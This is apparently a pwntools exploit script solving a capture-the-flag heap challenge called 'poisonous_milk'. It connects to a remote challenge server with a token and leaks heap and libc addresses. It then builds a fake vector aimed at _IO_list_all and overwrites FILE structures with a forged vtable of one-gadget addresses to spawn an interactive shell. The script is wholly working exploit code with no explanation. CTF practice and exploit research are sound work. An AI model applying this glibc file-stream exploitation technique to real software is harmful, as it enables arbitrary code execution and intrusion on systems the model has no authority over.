#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools

if "remote" in sys.argv:
    r = remote("52.27.136.59", 6969)
    r.sendlineafter("Token:", "mEP6d1BeoEWizpISCDr80Jn5vj2HrGTy")
    libc = ELF("./libc-2.23.so")
else:
    r = process(["./poisonous_milk", "86400"])
    libc = ELF("../../libc.so.6")

def put(flag, color=""):
    r.sendlineafter("> ", "p")
    r.sendlineafter(": ", flag)
    r.sendlineafter(": ", color)

def remove(idx):
    r.sendlineafter("> ", "r")
    r.sendlineafter(": ", str(idx))

def view():
    r.sendlineafter("> ", "v")
    l = r.recvuntil("> ", drop=True).split("\n")[:-1]
    r.sendline("")
    return [re.findall(" \[(.*)\]", i)[0] for i in l]

def drink():
    r.sendlineafter("> ", "d")

# leak
for i in range(19):
    put("a")

leak = view()

heap = u64(leak[17].ljust(8, '\0')) - 0x12290
log.info("heap = " + hex(heap))
libc_base = u64(leak[18].ljust(8, '\0')) - 0x3c3b88
log.info("libc_base = " + hex(libc_base)) 

# free the vector
drink()

# create fake vector points to _IO_list_all
io_list = libc_base + libc.symbols["_IO_list_all"]
put(p64(io_list) + p64(io_list) + p64(io_list + 800)[:-1])

# overwrite stderr
put(p64(0) + # _IO_write_base
    p64(1) + # _IO_write_ptr
    p64(0) * 9)
put(p64(0) * 7 + p64(heap+0x11d50))

# fake vtable
put(p64(libc_base + 0x4526a) * 10)

# trigger _IO_underflow
r.sendline("q")

r.interactive()
